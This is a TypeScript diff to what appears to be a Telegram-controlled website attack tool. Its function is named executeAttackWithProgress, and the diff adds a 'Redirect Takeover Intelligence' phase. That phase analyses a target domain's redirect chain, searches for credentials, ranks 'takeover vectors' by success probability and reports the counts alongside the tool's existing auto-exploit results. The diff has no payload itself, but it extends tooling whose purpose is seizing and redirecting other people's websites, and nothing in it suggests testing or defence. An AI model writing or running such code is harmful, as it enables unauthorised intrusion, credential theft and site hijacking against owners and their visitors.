@@ -6273,6 +6273,46 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       }
       stepIndex++;
 
+      // ═══ Phase 7: REDIRECT TAKEOVER INTELLIGENCE ═══
+      // วิเคราะห์ redirect chain + ค้นหา credentials + สร้าง takeover vectors
+      if (deepScanResult && (deepScanResult.isCurrentlyRedirecting || deepScanResult.redirectChain?.length > 0)) {
+        try {
+          await narrator.startPhase("intel", "🕵️ Redirect Takeover Intelligence");
+          const intelStep = await narrator.addStep("วิเคราะห์ redirect chain + ค้นหา credentials + สร้าง takeover vectors");
+          const intelStart = Date.now();
+          const { runTakeoverIntel, formatTakeoverIntelForTelegram } = await import("./redirect-takeover-intel");
+          const intelResult = await runTakeoverIntel({
+            domain,
+            targetUrl: effectiveTargetUrl !== `https://${domain}` ? effectiveTargetUrl : undefined,
+            redirectChain: deepScanResult.redirectChain?.map((h: any) => ({
+              url: h.url,
+              statusCode: h.statusCode,
+              redirectType: h.redirectType,
+            })),
+            currentDestination: deepScanResult.currentRedirectDestination,
+            maxDurationMs: 90_000, // 90 seconds
+            onProgress: async (_phase: string, detail: string) => {
+              try { await narrator.addAnalysis(`🕵️ ${detail.substring(0, 80)}`); } catch {}
+            },
+          });
+          const intelMs = Date.now() - intelStart;
+          const intelFormatted = formatTakeoverIntelForTelegram(intelResult);
+          // Split into chunks for Telegram (max 4096 chars)
+          const chunks = intelFormatted.match(/[\s\S]{1,3500}/g) || [intelFormatted];
+          for (const chunk of chunks) {
+            await narrator.addAnalysis(chunk);
+          }
+          await narrator.updateStep(intelStep, intelResult.takeoverVectors.length > 0 ? "done" : "failed",
+            `${intelResult.takeoverVectors.length} vectors | ${intelResult.allCredentials.length} creds | Top: ${intelResult.topVector?.name || "none"} (~${intelResult.topVector?.successProbability || 0}%)`,
+            intelMs
+          );
+          timings.push({ step: `Takeover Intel: ${intelResult.takeoverVectors.length} vectors`, ms: intelMs, ok: intelResult.takeoverVectors.length > 0 });
+          stepIndex++;
+        } catch (intelErr: any) {
+          await narrator.addAnalysis(`⚠️ Takeover Intel error: ${intelErr.message?.substring(0, 80)}`);
+        }
+      }
+
       // Complete
       const totalMs = Date.now() - scanStart;
       const vulnCount = deepScanResult?.vulnerabilities?.length || 0;
@@ -6281,11 +6321,13 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       // Check if auto-exploit was attempted and succeeded (look at timings)
       const autoExploitTiming = timings.find(t => t.step.startsWith("Auto-Exploit"));
       const autoExploitSucceeded = autoExploitTiming?.ok || false;
+      const intelTiming = timings.find(t => t.step.startsWith("Takeover Intel"));
       const overallSuccess = vulnCount > 0 || autoExploitSucceeded;
 
       await narrator.complete(overallSuccess,
         `Deep Redirect Scan + Auto-Exploit เสร็จ (${(totalMs / 1000).toFixed(1)}s) | Vulns: ${vulnCount} | PHP: ${phpCount} | Strategies: ${stratCount}` +
-        (autoExploitTiming ? ` | Auto-Exploit: ${autoExploitSucceeded ? "✅ สำเร็จ" : "❌ ไม่สำเร็จ"}` : "")
+        (autoExploitTiming ? ` | Auto-Exploit: ${autoExploitSucceeded ? "✅ สำเร็จ" : "❌ ไม่สำเร็จ"}` : "") +
+        (intelTiming ? ` | Intel: ${intelTiming.ok ? "✅" : "❌"}` : "")
       );
 
       // Save log
